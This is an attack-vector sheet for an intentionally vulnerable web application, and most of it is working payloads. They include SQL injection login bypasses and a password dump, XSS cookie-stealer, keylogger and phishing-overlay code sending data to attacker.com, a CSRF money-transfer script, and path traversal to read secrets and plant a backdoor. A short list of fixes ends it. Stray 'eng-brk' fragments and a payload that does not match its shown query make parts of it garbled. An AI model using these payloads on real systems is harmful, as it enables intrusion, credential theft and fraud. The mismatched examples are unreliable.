VULNERABLE WEB APPLICATION - ATTACK VECTORS
===========================================

This document contains attack vectors and techniques to exploit the vulnerabilities 
present in this application. FOR EDUCATIONAL PURPOSES ONLY.

1. SQL INJECTION VECTORS
------------------------

a) Login Bypass:
   - Email: ' OR 1=1 -- eng-brk
   - Password: anything
   
   Query becomes: SELECT * FROM users WHERE email='admin" OR "1"="1' AND pass='anything'
   
   Alternative:
   - Email: " OR ""="
   - Password: anything
   
   Query becomes: SELECT * FROM users WHERE email='" OR ""="' AND pass='anything'
   
   For MariaDB specific:
   - Email: admin' #
   - Password: anything
   
   Query becomes: SELECT * FROM users WHERE email='admin' #' AND pass='anything'
   
b) UNION Attack:
   - Search: ' UNION SELECT 1,concat(email,':',pass),3 FROM users -- 
   
   This reveals all usernames and passwords in a single result.

c) Blind SQL Injection:
   - Email: admin@example.com' AND (SELECT SUBSTRING(pass,1,1) FROM users WHERE id=1)='a
   
   By iterating through characters and positions, the attacker can extract data even 
   when error messages are suppressed.

d) Time-Based Injection:
   - Search: ' OR IF(1=1, SLEEP(5), 0) -- 
   
   If the page takes 5 seconds to load, injection is confirmed.


2. XSS PAYLOAD EXAMPLES
-----------------------

a) Cookie Stealer:
   <script>var i=new Image(); i.src="https://attacker.com/log.php?c="+document.cookie;</script>

b) Keylogger:
   <script>
   document.addEventListener('keypress', function(e) {
     fetch('https://attacker.com/log.php?key=' + e.key);
   });
   </script>

c) Phishing Form:
   <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:999">
     <h2>Session Expired</h2>
     <form action="https://attacker.com/steal.php">
       Email: <input name="email"><br>
       Password: <input type="password" name="password"><br>
       <button>Login Again</button>
     </form>
   </div>


3. CSRF ATTACK VECTORS
----------------------

a) Hidden Form Method:
   Create an invisible form that automatically submits, transferring money to attacker's account.

b) IMG Tag Method:--eng-brk
<script>
fetch("dashboard.php", {
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
    },
    body: "to_id=7&amount=10000000&transfer=Transfer+Money"
});
</script>


4. PATH TRAVERSAL EXPLOITATION
-----------------------------

a) Reading Sensitive Files:
   ?path=../../../xampp/passwords.txt
   
b) Writing to Executable Locations:
   ?backup=1&path=../../../xampp/htdocs/backdoor/
   
   This could create a backup file that contains a backdoor or sensitive information.


5. PREVENTION TECHNIQUES
-----------------------

For educational purposes, here's how these vulnerabilities could be fixed:

a) SQL Injection:
   - Use prepared statements with parameterized queries
   - Apply proper input validation
   - Implement least privilege principle

b) XSS:
   - Sanitize input/output using context-specific escaping
   - Implement Content Security Policy (CSP)
   - Use HttpOnly and Secure flags for cookies

c) CSRF:
   - Implement anti-CSRF tokens
   - Use SameSite cookie attribute
   - Verify referer header for sensitive actions

d) Path Traversal:
   - Validate and sanitize user input
   - Use server-side file path mapping
   - Implement proper access controls
   
e) Authentication & Session Management:
   - Implement proper session validation
   - Use secure password storage (hashing + salting)
   - Apply account lockout policies
